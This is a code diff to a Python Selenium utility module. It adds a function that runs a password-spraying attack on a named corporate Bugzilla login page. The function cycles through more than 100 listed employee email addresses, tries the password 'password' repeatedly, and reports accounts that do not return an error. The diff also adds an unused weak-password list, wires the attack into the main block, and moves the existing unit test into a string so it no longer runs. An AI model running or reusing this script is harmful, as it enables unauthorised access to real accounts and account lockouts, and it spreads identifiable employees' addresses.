@@ -443,11 +443,186 @@ def read_get_page_screenshot(input_url, input_path, input_filename, input_cookie
     return
 
 
+def brute_test_1():
+    from selenium import webdriver
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+
+    # Setup Chrome options
+    chrome_options = webdriver.ChromeOptions()
+
+    # Start the browser
+    driver = webdriver.Chrome("chromedriver.exe", options=chrome_options)
+    emails = [
+        "james.tung@liteon.com",
+        "roger.chen@liteon.com",
+        "michael.chen@liteon.com",
+        "leon.chang@liteon.com",
+        "charley.chang@liteon.com",
+        "tom.fang@liteon.com",
+        "angie.chang@liteon.com",
+        "zora.wang@liteon.com",
+        "max.hsieh@liteon.com",
+        "shilung.chiang@liteon.com",
+        "john.kuo@liteon.com",
+        "jason.lee@liteon.com",
+        "eric.lin@liteon.com",
+        "lewis.chiang@liteon.com",
+        "pei-shan.lee@liteon.com",
+        "sunny.hsieh@liteon.com",
+        "paul.hsu@liteon.com",
+        "hai.huang@liteon.com",
+        "steven.huang@liteon.com",
+        "johnny.wu@liteon.com",
+        "hubert.ouyang@liteon.com",
+        "shen.joe@liteon.com",
+        "celia.wang@liteon.com",
+        "vickie.tseng@liteon.com",
+        "chiu.anson@liteon.com",
+        "celia.wang@liteon.com",
+        "violet.yu@liteon.com",
+        "maurice.wang@liteon.com",
+        "jerry.hsu@liteon.com",
+        "alex.sung@liteon.com",
+        "john.huang@liteon.com",
+        "hank.kwuo@liteon.com",
+        "raymond.soong@liteon.com",
+        "mark.ku@liteon.com",
+        "ricky.liu@liteon.com",
+        "lucy.tseng@liteon.com",
+        "moris.lin@liteon.com",
+        "victor.lin@liteon.com",
+        "jason.tzeng@liteon.com",
+        "allan.lai@liteon.com",
+        "sean.shiue@liteon.com",
+        "jim.chen@liteon.com",
+        "norlis.amaya@liteon.com",
+        "keehane.ngoh@liteon.com",
+        "sin.heng.lim@liteon.com",
+        "marcelo.araujo@liteon.com",
+        "yiyun.huang@liteon.com",
+        "wj.lin@liteon.com",
+        "tom.soong@liteon.com",
+        "leonard.gaul@liteon.com",
+        "marcelo.barbosa@liteon.com",
+        "jonadaks.kramer@liteon.com",
+        "aline.sales@liteon.com",
+        "sofia.wang@liteon.com",
+        "wen.sun.tan@liteon.com",
+        "pierfranco.pontrandolfo@liteon.com",
+        "hao.hou@liteon.com",
+        "mario.barreto@liteon.com",
+        "sandy.ren@liteon.com",
+        "barton.li@liteon.com",
+        "jimmy.sheehan@liteon.com",
+        "pintoo.jha@liteon.com",
+        "luis.enrique.robles@liteon.com",
+        "julie.huang@liteon.com",
+        "ariana.silva@liteon.com",
+        "purna.chandra.biswal@liteon.com",
+        "victor.lv@liteon.com",
+        "megan.morta@liteon.com",
+        "rohit.giri@liteon.com",
+        "eduardo.duenas@liteon.com",
+        "kevin.liu@liteon.com",
+        "mudassir.ali@liteon.com",
+        "luis.ernesto.aranda@liteon.com",
+        "willyson.teixeira@liteon.com",
+        "melany.elizabeth.becerra@liteon.com",
+        "idon.pong@liteon.com",
+        "allen.song@liteon.com",
+        "akanksha.pandey@liteon.com",
+        "magaly.delgadillo@liteon.com",
+        "susan.liu@liteon.com",
+        "wing.eng@liteon.com",
+        "jingle.chang@liteon.com",
+        "bob.weng@liteon.com",
+        "gidelle.rocha@liteon.com",
+        "adalberto.junior@liteon.com",
+        "james.tsao@liteon.com",
+        "hill.dong@liteon.com",
+        "peggy.chang@liteon.com",
+        "jacky.juan@liteon.com",
+        "yaozheng.wu@liteon.com",
+        "tommy.wong@liteon.com",
+        "dingding.jiang@liteon.com",
+        "jack.tseng@liteon.com",
+        "tim.f@liteon.com",
+        "richard.guo@liteon.com",
+        "annielee.annielee@liteon.com",
+        "hp.cao@liteon.com",
+        "rebecca.ma@liteon.com",
+        "cheng.arvin@liteon.com",
+        "yonggao.deng@liteon.com",
+        "js.chen@liteon.com",
+        "elton.wang@liteon.com",
+        "dragon.liao@liteon.com",
+        "ben.yu@liteon.com",
+        "kingwin.liu@liteon.com",
+        "ricoxie.liteon@liteon.com",
+        "kant.li@liteon.com",
+        "pj.chang@liteon.com"
+    ]
+
+    for email in emails:
+        for i in range(0, 5):
+            # Navigate to the URL
+            driver.get('https://bug121.liteon.com/index.cgi?GoAheadAndLogIn=1')
+
+            # Fill in the form
+            driver.find_element(By.NAME, 'Bugzilla_login').send_keys(email)
+            driver.find_element(By.NAME, 'Bugzilla_password').send_keys('password')
+
+            # Submit the form
+            driver.find_element(By.NAME, 'GoAheadAndLogIn').submit()
+            try:
+                element = WebDriverWait(driver, 10).until(
+                    EC.presence_of_element_located((By.ID, "error_msg"))
+                )
+                print(element.text)
+                if element.text == 'The login or password you entered is not valid.':
+                    print('fail count:' + str(i))
+                else:
+                    print("found: " + email)
+                    break
+            except Exception as e:
+                print("Login failed:", e)
+    # Remember to close the browser
+    driver.quit()
+
+
+def brute_test_2():
+    weak_passwords = [
+        "Password01", "Qwerty123", "Abcd1234", "Admin1234", "Password02", "Qwerty1234", "Zxcvbnm1",
+        "Abcdefg1", "Admin5678", "Abcd5678", "Password03", "Qwerty01", "Zxcvbnm123", "Abcdefg2",
+        "Admin0000", "Abcd0000", "Password04", "Qwerty02", "Zxcvbnm234", "Abcdefg3", "Admin1111",
+        "Abcd1111", "Password05", "Qwerty03", "Zxcvbnm345", "Abcdefg4", "Admin2222", "Abcd2222",
+        "Password06", "Qwerty04", "Zxcvbnm456", "Abcdefg5", "Admin3333", "Abcd3333", "Password07",
+        "Qwerty05", "Zxcvbnm567", "Abcdefg6", "Admin4444", "Abcd4444", "Password08", "Qwerty06",
+        "Zxcvbnm678", "Abcdefg7", "Admin5555", "Abcd5555", "Password09", "Qwerty07", "Zxcvbnm789",
+        "Abcdefg8", "Admin6666", "Abcd6666", "Password10", "Qwerty08", "Zxcvbnm890", "Abcdefg9",
+        "Admin7777", "Abcd7777", "Password11", "Qwerty09", "Zxcvbnm901", "Abcdefg0", "Admin8888",
+        "Abcd8888", "Password12", "Qwerty10", "Zxcvbnm012", "Admin9999", "Abcd9999", "Password13",
+        "Qwerty11", "Zxcvbnm123", "Admin0000", "Abcd0000", "Password14", "Qwerty12", "Zxcvbnm234",
+        "Admin1111", "Abcd1111", "Password15", "Qwerty13", "Zxcvbnm345", "Admin2222", "Abcd2222",
+        "Password16", "Qwerty14", "Zxcvbnm456", "Admin3333", "Abcd3333", "Password17", "Qwerty15",
+        "Zxcvbnm567", "Admin4444", "Abcd4444", "Password18", "Qwerty16", "Zxcvbnm678", "Admin5555",
+        "Abcd5555", "Password19", "Qwerty17", "Zxcvbnm789", "Admin6666", "Abcd6666", "Password20",
+        "Qwerty18", "Zxcvbnm890", "Admin7777", "Abcd7777", "Password21", "Qwerty19", "Zxcvbnm901",
+        "Admin8888", "Abcd8888", "Password22", "Qwerty20", "Zxcvbnm012", "Admin9999", "Abcd9999",
+        "Password23", "Qwerty21", "Zxcvbnm123", "Admin0000", "Abcd0000", "Password24", "Qwerty22",
+        "Zxcvbnm234", "Admin1111", "Abcd1111", "Password25", "Qwerty23", "Zxcvbnm345", "Admin2222",
+    ]
+
+
+
 # testcase
 if __name__ == '__main__':
     # print(read_get(input_url="https://www.example.com"))
     # print(read_bing_search('Cymetrics'))
     # print(read_google_search('Cymetrics'))
+    brute_test_1()
     """
     # auto login ithome
     read_login_form(input_url="https://member.ithome.com.tw/login",
@@ -466,7 +641,7 @@ if __name__ == '__main__':
                       {'type': 'click', 'xpath': '/html/body/div/div/div/form/button', 'text': ''}]
     x_dict = read_login_header(input_url="https://member.ithome.com.tw/login",
                                input_action_list=test_json_list)
-    """
+    
     main_result = read_get_page(input_url="https://www.example.com")
     if "Example Domain" in main_result:
         print("unit test (custom_chrome) : pass")
@@ -474,5 +649,6 @@ if __name__ == '__main__':
     else:
         print("unit test (custom_chrome) : fail")
         sys.exit(1)
+    """
 
 
